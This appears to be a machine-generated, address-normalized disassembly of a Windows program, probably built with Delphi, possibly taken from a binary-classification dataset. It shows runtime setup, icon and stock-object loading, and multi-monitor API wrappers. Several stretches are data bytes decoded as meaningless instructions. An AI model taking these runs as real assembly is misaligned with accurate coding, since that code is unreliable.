mov [ rw-data ] eax
push 0x5
call GetStockObject
mov [ rw-data ] eax
push 0xd
call GetStockObject
mov [ rw-data ] eax
push 0x7f00
push 0x0
call LoadIconA
mov [ rw-data ] eax
call sub_424d8c
mov cx 0x2c
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d178
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d178
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d178
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424e58
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_414374
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_414374
mov [ rw-data ] eax
mov ecx sub_41d9d0
mov edx sub_41d9e0
mov eax [ sub_41c110 ]
call sub_413ad0
mov ecx r-xdata
mov edx sub_41dbe8
mov eax [ r-xdata ]
call sub_413ad0
sub_425318
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42533d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425344
retn
sub_425399
aas
inc ecx
add [ eax ] dh
inc ecx
inc ecx
add al bl
push esp
inc edx
add al ah
aas
inc ecx
add [ eax + eax * 2 + 0x41 ] bl
add [ ebx ] cl
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + ecx * 2 + 0x69 ] si
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
add al 0x54
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
push esp
inc edx
add [ eax ] cl
add [ eax ] al
add [ eax + 0x6c004010 ] bh
xor eax [ eax ]
js r-xdata
call sub_4030f4
mov [ esi + 0x10 ] 0x1
mov eax esi
test bl bl
je r-xdata
inc edx
add [ eax ] cl
add [ eax ] al
add [ eax + 0x6c004253 ] bh
xor eax [ eax ]
js r-xdata
lea eax [ eax ]
insb
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
pushad
push ebp
inc edx
add [ eax + 0x29 ] ch
inc eax
add [ ebp + edx * 2 + 0x55900042 ] ah
inc edx
add [ esp + edx * 2 ] cl
dec edi
jb r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
or [ ebx - 0x45170f3c ] al
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
pushad
push ebp
inc edx
add ah al
push ebp
inc edx
add [ ebp + edx * 2 + 0x55900042 ] ah
inc edx
add [ esi ] al
push esp
push ebx
je r-xdata
jb r-xdata
cli
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
arpl [ ebx - 0x70 ] bp
push esp
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x54 ] bh
dec esp
imul esi [ ebx + 0x74 ] 0x6c00408d
mov ecx ebx
mov edx edi
mov eax esi
call sub_414370
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
mov eax edi
call sub_403124
sub_425480
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030f4
mov [ esi + 0x10 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax esi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_4254d8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov ecx ebx
mov edx edi
mov eax esi
call sub_414370
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
mov eax edi
call sub_403124
sub_42551c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030f4
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax esi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_425560
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403124
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403114
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_4255a4
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_413ff8
mov eax esi
pop esi
pop ebx
retn
sub_4255d0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4255f5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4255fc
retn
sub_4256cc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4256f1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4256f8
retn
sub_425704
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4043a8
xor eax eax
push ebp
push sub_4257c3
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
xor eax eax
mov al bl
cmp [ eax + rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4257ca
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
cmp [ rw-data ] 0x0
je r-xdata
xor esi esi
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov esi edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4043b8
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov esi eax
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov al bl
mov [ eax + rw-data ] 0x1
mov [ rw-data ] 0x1
test esi esi
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_425704
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_403ef8
sub_4257ec
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
or eax 0xffffffff
mov edx ebx
add edx 0xffffffb4
sub edx 0x2
jb r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
xor eax eax
call sub_425704
mov [ rw-data ] eax
push ebx
call [ rw-data ]
jmp r-xdata
xor eax eax
jmp r-xdata
je r-xdata
pop ebx
pop ebp
retn 0x4
cmp eax 0xffffffff
jne r-xdata
xor ebx ebx
jmp r-xdata
dec edx
je r-xdata
push ebx
call GetSystemMetrics
mov ebx 0x1
dec edx
sub edx 0x2
jae r-xdata
mov eax 0x1
jmp r-xdata
sub_425874
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor esi esi
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x2
call sub_425704
mov [ rw-data ] eax
push edi
push ebx
call [ rw-data ]
mov esi eax
jmp r-xdata
mov esi 0x12340042
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp [ ebx + 0xc ] 0x0
jle r-xdata
push 0x0
call [ rw-data ]
cmp eax [ ebx ]
jle r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebx + 0x4 ]
jle r-xdata
sub_425904
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
and eax 0x3
test al al
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x1
call sub_425704
mov [ rw-data ] eax
push ebx
push esi
call [ rw-data ]
jmp r-xdata
push esi
call IsIconic
test eax eax
je r-xdata
mov eax 0x12340042
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetWindowPlacement
jmp r-xdata
push ebx
lea eax [ ebp - 0x10 ]
push eax
call sub_425874
sub_42599a
add [ eax ] al
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x3
call sub_425704
mov [ rw-data ] eax
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov ebx 0x12340042
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push 0x0
call [ rw-data ]
cmp esi eax
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jl r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_425a1b
call [ eax ]
add [ eax ] al
add [ ebp + 0x6f ] cl
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x6d6f7246
push eax
outsd
imul ebp [ esi + 0x74 ] 0x0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_425704
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_425b08
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x5
call sub_425704
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_425bdc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x6
call sub_425704
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_425cb0
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x7
call sub_425704
mov [ rw-data ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push edi
push esi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
push 0x0
call [ rw-data ]
mov [ ebp - 0x14 ] eax
push 0x1
call [ rw-data ]
mov [ ebp - 0x10 ] eax
test esi esi
je r-xdata
test edi edi
je r-xdata
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetClipBox
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push esi
call GetDCOrgEx
test eax eax
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push esi
push 0x12340042
call [ ebp + 0x10 ]
mov ebx eax
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
neg eax
push eax
mov eax [ ebp - 0x8 ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov bl 0x1
jmp r-xdata
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x1
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_425e4b
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_425e71
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425e78
retn
sub_425e8c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_425eb1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425eb8
retn
sub_425ec4
enter 0x425e 0x0
prefetchw [ ecx + 0x48 ]
insb
dec eax
insb
jo r-xdata
insb
arpl [ gs : edi + ebp * 2 + 0x72 ] si
sub al 0x11
inc eax
add [ ecx ] al
pop eax
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
adc ecx [ ecx + 0x45 ]
outsb
je r-xdata
push [ eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425eb8
retn
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
inc edx
outsb
dec eax
insb
adc [ ebx + 0x4fc000b9 ] esp
jae r-xdata
outsd
outsb
je r-xdata
pushad
inc edx
popad
outsb
popad
jb r-xdata
lodsd [ esi ]
jns r-xdata
imul esp [ ebp + 0x77 ] 0x5f307265
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
add [ edi ] cl
adc [ ecx + 0x43 ] ecx
jne r-xdata
add bh bh
push [ edi + ebx * 2 ]
inc edx
lodsd [ esi ]
imul esp [ ebp + 0x77 ] 0x112c7265
inc eax
add [ ecx ] al
xchg ebx eax
cld
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
jae r-xdata
add [ eax + eax ] cl
add [ eax ] al
int3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x42 ] ch
adc [ eax ] eax
add [ esi - 0x6d ] esp
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
outsb
je r-xdata
js r-xdata
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
adc [ eax ] eax
add [ ebx + edx * 4 - 0x4 ] esp
pop edi
outsb
je r-xdata
adc eax 0x65705349
arpl [ ecx + 0x61 ] bp
insb
je r-xdata
jns r-xdata
add [ edi ] cl
outsb
je r-xdata
dec [ ebx + 0x425f00c0 ]
add [ edi ] cl
or ecx [ ecx + 0x48 ]
insb
jo r-xdata
add bh bh
insb
jo r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
add ah cl
outsb
inc eax
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
jae r-xdata
jns r-xdata
add al al
dec edi
jae r-xdata
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
insd
dec eax
insb
jo r-xdata
jo r-xdata
insb
je r-xdata
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
jae r-xdata
dec ecx
imul esp [ ebp + 0x77 ] 0x5f6c7265
inc edx
add [ ecx ] al
xchg bx ax
cld
inc eax
add [ eax * 2 + 0x706c6548 ] dl
push ebx
jns r-xdata
inc eax
add [ eax + esi + 0x30d80040 ] bh
inc eax
add [ ecx + esi ] dl
outsb
je r-xdata
push esi
je r-xdata
add [ edi ] cl
or al 0x49
dec eax
insb
jo r-xdata
add bh bh
dec [ ebx + 0x425fecc0 ]
pop edi
inc edx
add bh bh
[ edi + ebx * 2 + 0x150f0042 ]
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
inc edx
add [ ecx ] al
xchg bx ax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
pop edi
insd
sub al 0x11
inc eax
add [ ecx ] al
push ebx
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
movlps [ ecx + 0x45 ] xmm1
add bh bh
dec [ ebx + 0x425f70c0 ]
add [ edi ] cl
imul ebp [ edi + 0x6e ] 0xd000408d
pushad
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
pushad
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl ah
pushad
inc edx
add [ eax + eax ] cl
add [ eax ] al
mov eax 0x6c004010
xor eax [ eax ]
js r-xdata
jae r-xdata
inc edx
add [ eax + eax ] al
insd
inc ebp
js r-xdata
jo r-xdata
cmp cl [ ecx ]
imul esp [ ebp + 0x77 ] 0x6f4e7265
mov eax eax
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] dh
pop edi
lea eax [ eax ]
insb
pushad
inc edx
add [ eax ] al
add [ eax ] al
add bh bh
dec [ ebp + 0x606c0040 ]
xor [ edx ] ecx
add [ eax ] al
add eax 0xffffffd4
jmp r-xdata
add [ eax ] al
andps xmm1 [ eax + 0x65 ]
insb
jo r-xdata
add al 0x0
jo r-xdata
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_426c57
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
int3
mov eax eax
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_403f4c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_4038b0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426c5e
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404980
lea eax [ ebp - 0x8 ]
call sub_405598
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4055dc
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_4254bc
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4055b0
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4055dc
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_426288
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_4262fe
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
mov [ eax ] edx
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ rw-data ]
call sub_426414
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4055b0
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426305
lea eax [ ebp - 0x8 ]
call sub_405598
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4263a0
mov [ rw-data ] eax
sub_42630c
push ebp
mov ebp esp
push ebx
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov [ ebx ] eax
mov eax ebx
mov edx [ rw-data ]
test edx edx
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4263a0
mov [ rw-data ] eax
mov ecx r-xdata
call sub_4055dc
xor eax eax
pop ebx
pop ebp
retn
sub edx 0xfffffff8
sub_426364
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_4055b0
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_4263a0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030f4
mov dl 0x1
mov eax [ r-xdata ]
call sub_425480
mov [ esi + 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_425480
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_425480
mov [ esi + 0x18 ] eax
lea eax [ esi + 0x24 ]
call sub_403ef8
mov [ esi + 0x1c ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax esi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_426414
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_426515
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_426364
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x10 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_4254d0
mov edx [ esi + 0x8 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x24 ]
lea eax [ ebp - 0x8 ]
call sub_405598
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40d1d0
test al al
je r-xdata
lea eax [ ebp - 0xc ]
call sub_405598
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40d1d0
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_426364
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x14 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_4254d0
inc [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx ebx
test edx edx
je r-xdata
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_426364
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x18 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_4254d0
mov ecx r-xdata
call sub_4055dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42651c
lea eax [ ebp - 0xc ]
call sub_405598
lea eax [ ebp - 0x8 ]
call sub_405598
retn
sub edx 0xfffffff8
sub_426534
push ebx
push esi
push edi
mov ebx eax
jmp r-xdata
mov esi [ ebx + 0x10 ]
mov edi [ esi + 0x8 ]
test edi edi
jg r-xdata
mov edx edi
dec edx
mov eax esi
call sub_4254bc
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x8 ]
pop edi
pop esi
pop ebx
retn
sub_426574
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x10 ]
mov edx esi
call sub_4254bc
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x28 ]
inc esi
dec ebx
jne r-xdata
sub_4265a4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor edx edx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_426736
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x1
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax esi
xor edx edx
call sub_4254bc
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x0
jle r-xdata
mov dl 0x1
mov eax [ r-xdata ]
